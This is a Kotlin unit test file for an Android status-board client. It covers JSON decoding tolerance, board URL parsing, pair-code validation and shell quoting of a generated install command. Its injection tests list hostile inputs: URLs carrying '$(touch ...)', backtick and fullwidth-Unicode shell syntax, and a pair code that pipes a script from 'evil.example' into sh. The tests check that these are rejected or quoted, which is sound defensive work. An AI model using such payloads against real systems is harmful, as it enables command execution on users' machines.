package com.kardanov.agstatus

import kotlinx.serialization.decodeFromString
import kotlinx.serialization.encodeToString
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test

/**
 * Wire-format tests for the decoder the REST and SSE clients share. The point
 * is tolerance: a board must survive an older or newer server, not crash on it.
 */
class ApiParsingTest {

    // MARK: - Session

    @Test
    fun sessionDecodesFromIdAlone() {
        val session = AgStatusJson.decodeFromString<Session>("""{"id":"sess-1"}""")

        assertEquals("sess-1", session.id)
        assertEquals("", session.name)
        assertEquals(AgentStatus.IDLE, session.status)
        assertEquals("", session.message)
        assertEquals("", session.project)
        assertEquals("claude", session.source)
        assertEquals(0L, session.createdAt)
        assertEquals(0L, session.updatedAt)
        assertEquals("sess-1", session.displayName)
    }

    @Test
    fun sessionDecodesEveryField() {
        val json = """
            {"id":"sess-abc","name":"Refactor auth","status":"coding",
             "message":"Editing server.ts","project":"my-repo","source":"codex",
             "createdAt":1752096000000,"updatedAt":1752096030000}
        """.trimIndent()

        val session = AgStatusJson.decodeFromString<Session>(json)

        assertEquals("Refactor auth", session.displayName)
        assertEquals(AgentStatus.CODING, session.status)
        assertTrue(session.status.isActive)
        assertEquals("codex", session.source)
        assertEquals(1752096030000L, session.updatedAt)
    }

    @Test
    fun unknownStatusDegradesToIdle() {
        val session = AgStatusJson.decodeFromString<Session>("""{"id":"s","status":"vibing"}""")

        assertEquals(AgentStatus.IDLE, session.status)
    }

    @Test
    fun unknownKeysAreIgnored() {
        val json = """
            {"id":"s","status":"blocked","priority":"high",
             "labels":["a","b"],"nested":{"deep":{"deeper":1}}}
        """.trimIndent()

        val session = AgStatusJson.decodeFromString<Session>(json)

        assertEquals(AgentStatus.BLOCKED, session.status)
    }

    @Test
    fun sessionListDecodes() {
        val json = """[{"id":"a","status":"done"},{"id":"b","status":"testing"}]"""

        val sessions = AgStatusJson.decodeFromString<List<Session>>(json)

        assertEquals(listOf("a", "b"), sessions.map { it.id })
        assertEquals(AgentStatus.DONE, sessions[0].status)
        assertEquals(AgentStatus.TESTING, sessions[1].status)
    }

    // MARK: - Host (Focus)

    @Test
    fun sessionDecodesHost() {
        val json = """
            {"id":"sess-abc","status":"blocked",
             "host":{"machine":{"id":"$MACHINE_ID","name":"MacBook"},
                     "app":{"slug":"agterm","name":"agterm","kind":"terminal"}}}
        """.trimIndent()

        val session = AgStatusJson.decodeFromString<Session>(json)

        val host = session.host!!
        assertEquals(MACHINE_ID, host.machine.id)
        assertEquals("MacBook", host.machine.name)
        assertEquals("MacBook", host.machine.displayName)
        assertEquals("agterm", host.app.slug)
        assertEquals("agterm", host.app.displayName)
        assertEquals("terminal", host.app.kind)
    }

    @Test
    fun sessionWithoutHostHasNone() {
        assertNull(AgStatusJson.decodeFromString<Session>("""{"id":"s"}""").host)
        assertNull(AgStatusJson.decodeFromString<Session>("""{"id":"s","host":null}""").host)
    }

    @Test
    fun malformedHostReadsAsNullWithoutFailingTheSession() {
        val malformed = listOf(
            """{"id":"s","status":"coding","host":"MacBook"}""",                      // not an object
            """{"id":"s","status":"coding","host":42}""",
            """{"id":"s","status":"coding","host":{"machine":"MacBook"}}""",          // machine not an object
            """{"id":"s","status":"coding","host":{"machine":{"name":"MacBook"}}}""", // no machine id
            """{"id":"s","status":"coding","host":{"app":{"slug":"agterm"}}}""",       // no machine at all
            """{"id":"s","status":"coding","host":{"machine":{"id":42,"name":"x"}}}""",
            """{"id":"s","status":"coding","host":{"machine":{"id":"mac-1","name":"x"}}}""", // not a per-board hash
        )

        for (json in malformed) {
            val session = AgStatusJson.decodeFromString<Session>(json)
            assertNull("expected no host for $json", session.host)
            assertEquals(AgentStatus.CODING, session.status)
        }
    }

    @Test
    fun hostToleratesMissingAppAndBlankLabels() {
        val session = AgStatusJson.decodeFromString<Session>(
            """{"id":"s","host":{"machine":{"id":"$MACHINE_ID","name":""}}}"""
        )

        val host = session.host!!
        assertEquals("Machine", host.machine.displayName)
        assertEquals("other", host.app.slug)
        assertEquals("the app", host.app.displayName)
        assertEquals("unknown", host.app.kind)
    }

    @Test
    fun hostIgnoresUnknownKeys() {
        val session = AgStatusJson.decodeFromString<Session>(
            """{"id":"s","host":{"machine":{"id":"$MACHINE_ID","name":"Mac","platform":"darwin"},
                "app":{"slug":"kitty","name":"kitty","kind":"terminal","bundle":"x"},"reach":"tab"}}"""
        )

        assertEquals("kitty", session.host?.app?.slug)
    }

    // MARK: - Machines

    @Test
    fun machinesFrameDecodes() {
        val json = """
            [{"id":"$MACHINE_ID","name":"MacBook","online":true,"since":1752096000000},
             {"id":"$OTHER_ID","name":"PC","online":true,"since":1752096001000,"platform":"win32"}]
        """.trimIndent()

        val machines = AgStatusJson.decodeFromString<List<MachinePresence>>(json)

        assertEquals(listOf(MACHINE_ID, OTHER_ID), machines.map { it.id })
        assertEquals("MacBook", machines[0].name)
        assertTrue(machines[0].online)
        assertEquals(1752096000000L, machines[0].since)
        assertNull(machines[0].lastSeen)
    }

    @Test
    fun offlineMachineFrameKeepsTheNameItHad() {
        val online = AgStatusJson.decodeFromString<MachinePresence>(
            """{"id":"$MACHINE_ID","name":"MacBook","online":true,"since":1752096000000}"""
        )
        val offline = AgStatusJson.decodeFromString<MachinePresence>(
            """{"id":"$MACHINE_ID","online":false,"lastSeen":1752096900000}"""
        )

        assertEquals("", offline.name)
        assertFalse(offline.online)
        assertEquals(1752096900000L, offline.lastSeen)

        val merged = offline.mergedOver(online)
        assertEquals("MacBook", merged.name)
        assertFalse(merged.online)
        assertEquals(1752096900000L, merged.lastSeen)
        assertEquals(1752096000000L, merged.since)
        assertEquals(offline, offline.mergedOver(null))
    }

    // MARK: - Commands

    @Test
    fun commandRequestEncodesTheWireKeys() {
        val body = AgStatusJson.encodeToString(
            CommandRequest(id = COMMAND_ID, type = CommandType.FOCUS.wire, sessionId = "sess-abc")
        )

        assertEquals("""{"id":"$COMMAND_ID","type":"focus","session_id":"sess-abc"}""", body)
    }

    @Test
    fun commandReceiptDecodes() {
        val receipt = AgStatusJson.decodeFromString<CommandReceipt>(
            """{"id":"$COMMAND_ID","delivered":false,"expires_in_ms":120000}"""
        )

        assertEquals(COMMAND_ID, receipt.id)
        assertFalse(receipt.delivered)
        assertEquals(120000L, receipt.expiresInMs)
    }

    @Test
    fun commandAckDecodes() {
        val ack = AgStatusJson.decodeFromString<CommandAck>(
            """{"id":"$COMMAND_ID","session_id":"sess-abc","machine_id":"$MACHINE_ID",
                "type":"focus","result":"focused","reach":"tab","reason":null}"""
        )

        assertEquals(COMMAND_ID, ack.id)
        assertEquals("sess-abc", ack.sessionId)
        assertEquals(MACHINE_ID, ack.machineId)
        assertEquals(CommandResult.FOCUSED, CommandResult.fromWire(ack.result))
        assertEquals(CommandReach.TAB, CommandReach.fromWire(ack.reach))
        assertNull(ack.reason)
    }

    @Test
    fun commandAckWithUnknownReasonStillDecodes() {
        val ack = AgStatusJson.decodeFromString<CommandAck>(
            """{"id":"$COMMAND_ID","session_id":"sess-abc","machine_id":"$MACHINE_ID",
                "type":"focus","result":"failed","reach":null,"reason":"gremlins"}"""
        )

        assertEquals("gremlins", ack.reason)
        assertEquals(CommandResult.FAILED, CommandResult.fromWire(ack.result))
        assertNull(CommandReason.fromWire(ack.reason))
    }

    @Test
    fun commandStateDecodesAndReadsAsAnAck() {
        val pending = AgStatusJson.decodeFromString<CommandState>(
            """{"id":"$COMMAND_ID","type":"focus","session_id":"sess-abc","machine_id":"$MACHINE_ID",
                "state":"pending","result":null,"reach":null,"reason":null,
                "created_at":1752096000000,"expires_at":1752096120000,"claimed_at":null,"done_at":null}"""
        )
        assertFalse(pending.isFinished)

        val done = AgStatusJson.decodeFromString<CommandState>(
            """{"id":"$COMMAND_ID","session_id":"sess-abc","state":"done","result":"selected","reach":"pane"}"""
        )
        assertTrue(done.isFinished)
        assertEquals("selected", done.asAck().result)
        assertEquals("sess-abc", done.asAck().sessionId)

        val expired = AgStatusJson.decodeFromString<CommandState>(
            """{"id":"$COMMAND_ID","session_id":"sess-abc","state":"expired"}"""
        )
        assertTrue(expired.isFinished)
        assertEquals("failed", expired.asAck().result)
        assertEquals("expired", expired.asAck().reason)
    }

    // MARK: - Usage

    @Test
    fun usageWindowClampsOutOfRangePercentages() {
        val windows = AgStatusJson.decodeFromString<List<UsageWindow>>(
            """[{"id":"a","usedPct":142.5},{"id":"b","usedPct":-20},{"id":"c","usedPct":42}]"""
        )

        assertEquals(1.0f, windows[0].fraction, 0.0001f)
        assertEquals(0.0f, windows[1].fraction, 0.0001f)
        assertEquals(0.42f, windows[2].fraction, 0.0001f)
    }

    @Test
    fun usageWindowFallsBackToItsId() {
        val window = AgStatusJson.decodeFromString<UsageWindow>("""{"id":"week"}""")

        assertEquals("week", window.displayLabel)
        assertEquals(0.0f, window.fraction, 0.0001f)
        assertNull(window.resetsAt)
    }

    @Test
    fun usageInfoDecodesWindowsAndNamesSources() {
        val json = """
            [{"source":"claude","updatedAt":1752096030000,"windows":[
                {"id":"session","label":"Current session","usedPct":42,"resetsAt":1752100000000},
                {"id":"week","label":"Weekly (all models)","usedPct":61.5,"resetsAt":null}]},
             {"source":"codex","windows":[]},
             {"source":"gemini"}]
        """.trimIndent()

        val usage = AgStatusJson.decodeFromString<List<UsageInfo>>(json)

        assertEquals("Claude", usage[0].displayName)
        assertEquals(2, usage[0].windows.size)
        assertEquals("Current session", usage[0].windows[0].displayLabel)
        assertEquals(1752100000000L, usage[0].windows[0].resetsAt)
        assertEquals(0.615f, usage[0].windows[1].fraction, 0.0001f)
        assertNull(usage[0].windows[1].resetsAt)
        assertEquals("Codex", usage[1].displayName)
        assertEquals("Gemini", usage[2].displayName)
        assertEquals(emptyList<UsageWindow>(), usage[2].windows)
    }

    // MARK: - History

    @Test
    fun historyDecodesTimeline() {
        val json = """
            [{"seq":2,"status":"testing","message":"npm test","at":1752096030000},
             {"seq":1,"status":"coding","message":"Editing server.ts","at":1752096010000},
             {"seq":0,"status":"idle","message":"Session started","at":1752096000000}]
        """.trimIndent()

        val history = AgStatusJson.decodeFromString<List<HistoryEvent>>(json)

        assertEquals(listOf(2L, 1L, 0L), history.map { it.seq })
        assertEquals(AgentStatus.TESTING, history[0].status)
        assertEquals("npm test", history[0].message)
        assertEquals(1752096000000L, history[2].at)
    }

    @Test
    fun historyEventToleratesMissingFields() {
        val event = AgStatusJson.decodeFromString<HistoryEvent>("""{"seq":7,"status":"soaring"}""")

        assertEquals(7L, event.seq)
        assertEquals(AgentStatus.IDLE, event.status)
        assertEquals("", event.message)
        assertEquals(0L, event.at)
    }

    // MARK: - Board.parse

    @Test
    fun parsesWorkspaceUrl() {
        val board = Board.parse("https://agstatus.online/w/$TOKEN")

        assertEquals("https://agstatus.online", board?.baseUrl)
        assertEquals(TOKEN, board?.token)
        assertEquals("https://agstatus.online/w/$TOKEN", board?.boardUrl)
        assertEquals("https://agstatus.online/w/$TOKEN/webhook", board?.webhookUrl)
        assertTrue(board!!.isDefaultServer)
    }

    @Test
    fun parsesWorkspaceUrlWithTrailingSlashOrWebhookSuffix() {
        val expected = Board("https://agstatus.online", TOKEN)

        assertEquals(expected, Board.parse("https://agstatus.online/w/$TOKEN/"))
        assertEquals(expected, Board.parse("https://agstatus.online/w/$TOKEN/webhook"))
        assertEquals(expected, Board.parse("https://agstatus.online/w/$TOKEN/webhook/"))
        assertEquals(expected, Board.parse("  https://agstatus.online/w/$TOKEN  "))
    }

    @Test
    fun parsesLegacyOrigins() {
        assertEquals(Board("https://board.example.com", null), Board.parse("https://board.example.com"))
        assertEquals(Board("https://board.example.com", null), Board.parse("https://board.example.com/"))
        assertEquals(Board("https://board.example.com", null), Board.parse("https://board.example.com/webhook"))
        assertEquals(Board("http://192.168.1.10:8080", null), Board.parse("http://192.168.1.10:8080/"))
    }

    @Test
    fun legacyBoardServesItselfAsTheBoard() {
        val board = Board.parse("http://agstatus.local:4000")!!

        assertNull(board.token)
        assertEquals("http://agstatus.local:4000", board.boardUrl)
        assertEquals("http://agstatus.local:4000/webhook", board.webhookUrl)
        assertFalse(board.isDefaultServer)
    }

    @Test
    fun rejectsUrlsThatArentBoards() {
        val rejected = listOf(
            "agstatus.online/w/$TOKEN",              // no scheme
            "ftp://agstatus.online/w/$TOKEN",        // wrong scheme
            "https://",                              // no host
            "https:///w/$TOKEN",                     // no host
            "https://agstatus.online/w/ags_short",   // token too short
            "https://agstatus.online/w/$TOKEN!",     // token has an illegal character
            "https://agstatus.online/x/$TOKEN",      // wrong path prefix
            "https://agstatus.online/w/$TOKEN/extra",
            "https://agstatus.online/dashboard",
            "",
        )

        rejected.forEach { assertNull("expected null for $it", Board.parse(it)) }
    }

    // MARK: - Board.parse: the authority is a host and nothing else

    @Test
    fun rejectsAuthoritiesCarryingUserinfoOrShellSyntax() {
        val rejected = listOf(
            // The reported QR: OkHttp reads the junk as a username and still
            // reaches agstatus.online, which is what made it convincing.
            "https://x;\$(touch\${IFS}pwned1);@agstatus.online/w/$TOKEN",
            "https://x;touch pwned2;@agstatus.online/w/$TOKEN",
            "https://user@agstatus.online/w/$TOKEN",
            "https://user:pass@agstatus.online/w/$TOKEN",
            "https://agstatus.online;id/w/$TOKEN",
            "https://agstatus.online\$(id)/w/$TOKEN",
            "https://x\$(id).example/w/$TOKEN",
            "https://`id`.example/w/$TOKEN",
            "https://a'b.example/w/$TOKEN",
            "https://agst atus.online/w/$TOKEN",
            "https://a%3Bb.example/w/$TOKEN",
            // Where OkHttp and a split on `/` would disagree about where the host ends.
            "https://agstatus.online\\@evil.example/w/$TOKEN",
            "https://evil.example\\agstatus.online/w/$TOKEN",
            "https://agstatus.online?x=1",
            "https://agstatus.online#frag",
        )

        rejected.forEach { assertNull("expected null for $it", Board.parse(it)) }
    }

    @Test
    fun aUnicodeHostIsAdoptedAsThePunycodeOfTheSameHost() {
        // What OkHttp has always resolved, and what the iPhone adopts for the
        // same QR (DemoData.verifyPairing): both clients take this board.
        val board = Board.parse("https://bücher.example/w/$TOKEN")
        assertEquals(Board("https://xn--bcher-kva.example", TOKEN), board)
        assertEquals(
            Board("https://xn--bcher-kva.example:8443", null),
            Board.parse("https://BÜCHER.Example:8443/"),
        )
        assertEquals("https://xn--80aai0dbebi.xn--p1ai", Board.origin("https://агстатус.рф"))
        // Saved in its punycode form, it reads back as itself; saved as typed
        // by a build that kept the raw text, it is repaired to the same.
        assertEquals(board, Board.restore(board!!.baseUrl, board.token))
        assertEquals(board, Board.restore("https://bücher.example", TOKEN))
        assertEquals(
            "curl -fsSL https://agstatus.online/install.sh | sh -s -- --code 'ABCD-EFGH'" +
                " --url 'https://xn--bcher-kva.example'",
            PairCode("ABCD-EFGH", 900).command(board),
        )
    }

    @Test
    fun aUnicodeHostIsHeldToTheClassAfterIdnaAsWellAsBefore() {
        // Each is let past the as-typed check (non-ASCII) and comes out of
        // OkHttp's NFKC mapping as ASCII shell syntax, which it keeps in a host.
        val rejected = listOf(
            "https://a；b.example/w/$TOKEN",               // fullwidth semicolon -> a;b
            "https://a＄（id）.example/w/$TOKEN",  // fullwidth $( ) -> a$(id)
            "https://a＇b.example/w/$TOKEN",               // fullwidth apostrophe -> a'b
            "https://a｀id｀.example/w/$TOKEN",        // fullwidth grave -> a`id`
            "https://a｜b.example/w/$TOKEN",               // fullwidth vertical line -> a|b
            "https://a;b.example/w/$TOKEN",               // Greek question mark -> a;b
            // Mixed: the ASCII half is refused as typed, before IDNA is reached.
            "https://a＄(id).example/w/$TOKEN",
            // A fullwidth @ maps to `@`, which OkHttp refuses in a host outright.
            "https://x＠agstatus.online/w/$TOKEN",
        )

        rejected.forEach { assertNull("expected null for $it", Board.parse(it)) }
        rejected.forEach { assertNull("expected null for $it", Board.origin(it)) }
        // restore() holds a saved one to the same rule, through origin().
        assertNull(Board.restore("https://a；b.example", TOKEN))
    }

    @Test
    fun anUnderscoreIsNotShellSyntaxAndIsAccepted() {
        // The same board iOS accepts. Android reaches it over HTTPS only, and
        // that is network_security_config's doing, not the authority class.
        assertEquals(Board("http://dev_pc.local:3000", null), Board.parse("http://dev_pc.local:3000"))
        val board = Board.parse("https://my_host.example/w/$TOKEN")
        assertEquals(Board("https://my_host.example", TOKEN), board)
        assertEquals(board, Board.restore(board!!.baseUrl, board.token))
        assertEquals(
            "curl -fsSL https://agstatus.online/install.sh | sh -s -- --code 'ABCD-EFGH'" +
                " --url 'https://my_host.example'",
            PairCode("ABCD-EFGH", 900).command(board),
        )
    }

    @Test
    fun rebuildsTheOriginRatherThanKeepingTheTextAsTyped() {
        val expected = Board("https://agstatus.online", TOKEN)

        assertEquals(expected, Board.parse("https://AgStatus.Online/w/$TOKEN"))
        assertEquals(expected, Board.parse("HTTPS://agstatus.online/w/$TOKEN"))
        // A default port is not a self-hosted server: no `--url` for it. An
        // empty port is the default one (RFC 3986), and OkHttp agrees.
        assertEquals(expected, Board.parse("https://agstatus.online:443/w/$TOKEN"))
        assertEquals(expected, Board.parse("https://agstatus.online:/w/$TOKEN"))
        assertTrue(Board.parse("https://agstatus.online:443/w/$TOKEN")!!.isDefaultServer)
        assertEquals(Board("http://board.example", null), Board.parse("http://board.example:80"))

        assertEquals(Board("https://board.example:8443", TOKEN), Board.parse("https://board.example:8443/w/$TOKEN"))
        assertEquals(Board("http://[::1]:3000", null), Board.parse("http://[::1]:3000"))
        assertEquals(Board("http://10.0.2.2:3000", null), Board.parse("http://10.0.2.2:3000/"))
    }

    @Test
    fun originIsTheSameRuleForATypedServer() {
        assertEquals("https://board.example:8443", Board.origin("https://Board.Example:8443/some/path"))
        assertEquals("https://agstatus.online", Board.origin("https://agstatus.online:443"))
        assertNull(Board.origin("https://user@board.example"))
        assertNull(Board.origin("https://x;\$(id);@board.example"))
        assertNull(Board.origin("ftp://board.example"))
        assertNull(Board.origin("board.example"))
        assertNull(Board.origin(""))
    }

    // MARK: - Board.restore (boards saved by earlier builds)

    @Test
    fun restoreRepairsAPoisonedOriginToTheHostItWasReachingAllAlong() {
        val expected = Board("https://agstatus.online", TOKEN)

        val repaired = Board.restore("https://x;\$(touch\${IFS}pwned1);@agstatus.online", TOKEN)
        assertEquals(expected, repaired)
        assertTrue(repaired!!.isDefaultServer)
        assertEquals(expected, Board.restore("https://x;touch pwned2;@agstatus.online", TOKEN))
        assertEquals(
            Board("https://board.example:8443", TOKEN),
            Board.restore("https://u:p@Board.Example:8443", TOKEN),
        )
        // The repaired board pairs with no `--url` at all, quoted or not.
        assertEquals(
            "curl -fsSL https://agstatus.online/install.sh | sh -s -- --code 'ABCD-EFGH'",
            PairCode("ABCD-EFGH", 900).command(repaired),
        )
    }

    @Test
    fun restoreKeepsACleanBoardExactlyAsSaved() {
        val clean = listOf(
            Board("https://agstatus.online", TOKEN),
            Board("https://board.example:8443", TOKEN),
            Board("http://192.168.1.10:8080", null),
            Board("http://10.0.2.2:3000", null),
            Board("http://[::1]:3000", null),
        )

        clean.forEach { assertEquals(it, Board.restore(it.baseUrl, it.token)) }
    }

    @Test
    fun restoreDropsWhatItCannotRepair() {
        val unrepairable = listOf(
            "not a url",
            "ftp://agstatus.online",
            "https://",
            // The host itself is the payload: there is no cleaner host to keep.
            "https://x\$(id).example",
            "https://a;b.example",
        )

        unrepairable.forEach { assertNull("expected null for $it", Board.restore(it, TOKEN)) }
    }

    // MARK: - PairCode

    @Test
    fun pairCodeAcceptsTheServersShapeAndStoresItCanonical() {
        assertEquals("ABCD-EFGH", PairCode.normalize("ABCD-EFGH"))
        assertEquals("ABCD-EFGH", PairCode.normalize("abcd-efgh"))
        // Servers from before the display dash sent the eight bare.
        assertEquals("ABCD-EFGH", PairCode.normalize("ABCDEFGH"))
        assertEquals("2345-6789", PairCode.normalize("23456789"))
        assertEquals("WXYZ-PQRS", PairCode.normalize("wxyzPQRS"))

        val fromServer = PairCode.fromServer("abcdefgh", 900)
        assertEquals(PairCode("ABCD-EFGH", 900), fromServer)
    }

    @Test
    fun pairCodeRejectsShellSyntaxAndAnythingOffTheAlphabet() {
        val rejected = listOf(
            "ABCD-EFGH; curl -fsSL http://evil.example/x.sh | sh #", // the tester's payload
            "ABCD;EFGH",
            "AB\$(id)GH",
            "ABCD-\$(id)",
            "ABCD`id`",
            "ABCD EFGH",
            "ABCD-EFGH ",
            " ABCD-EFGH",
            "ABCD-EFGH\n",
            "ABCD\nEFGH",
            "ABCD-EFG#",
            "ABCD-EFGH#",
            "ABCD-EFG'",
            // Off the alphabet: I, L, O, 0 and 1 are never minted.
            "ABCD-1234",
            "ABCD-EFGI",
            "ABCD-EFGL",
            "ABCD-EFGO",
            "ABCD-EFG0",
            // Off the shape.
            "ABC-DEFGH",
            "ABCD--EFGH",
            "ABCD-EFGHJ",
            "ABCDEFG",
            "ABCD_EFGH",
            "",
            // Uppercases into the alphabet, but was never ASCII.
            "abcdefgſ",
            "ＡBCD-EFGH",
        )

        rejected.forEach {
            assertNull("expected null for $it", PairCode.normalize(it))
            assertNull("expected null for $it", PairCode.fromServer(it, 900))
        }
    }

    @Test
    fun aPairCodeCannotBeBuiltAroundAnUncheckedValue() {
        listOf("ABCD-EFGH; id", "abcd-efgh", "ABCDEFGH").forEach { raw ->
            try {
                PairCode(raw, 900)
                fail("expected PairCode($raw) to be refused")
            } catch (expected: IllegalArgumentException) {
                // The init block refuses anything but the canonical form.
            }
        }
    }

    @Test
    fun pairCommandQuotesEveryValueItInterpolates() {
        val code = PairCode.fromServer("ABCD-EFGH", 900)!!

        assertEquals(
            "curl -fsSL https://agstatus.online/install.sh | sh -s -- --code 'ABCD-EFGH'",
            code.command(Board("https://agstatus.online", TOKEN)),
        )
        assertEquals(
            "curl -fsSL https://agstatus.online/install.sh | sh -s -- " +
                "--code 'ABCD-EFGH' --url 'https://board.example:8443'",
            code.command(Board.parse("https://board.example:8443/w/$TOKEN")!!),
        )
        // The backstop: a baseUrl that never went through parse() — as every
        // saved board did before restore() — is still one shell word.
        assertEquals(
            "curl -fsSL https://agstatus.online/install.sh | sh -s -- " +
                "--code 'ABCD-EFGH' --url 'https://x;\$(id);@agstatus.online'",
            code.command(Board("https://x;\$(id);@agstatus.online", TOKEN)),
        )
    }

    @Test
    fun shellQuotingEscapesAnEmbeddedQuote() {
        assertEquals("'ABCD-EFGH'", shellQuoted("ABCD-EFGH"))
        assertEquals("'it'\\''s'", shellQuoted("it's"))
        assertEquals("''\\'''", shellQuoted("'"))
        assertEquals("'\$(id); `id` #'", shellQuoted("\$(id); `id` #"))
        assertEquals("''", shellQuoted(""))
    }

    private companion object {
        // Built rather than written out, matching the server tests: a literal
        // 32-character token has enough entropy to trip secret scanners.
        val TOKEN = "ags_" + "a".repeat(32)

        /** Per-board machine hashes: 32 lowercase hex, like the real ones. */
        val MACHINE_ID = "9f2c".padEnd(32, '0')
        val OTHER_ID = "7c2e".padEnd(32, '1')
        const val COMMAND_ID = "6c1f0a2b-3d4e-4f50-8a6b-7c8d9e0f1a2b"
    }
}
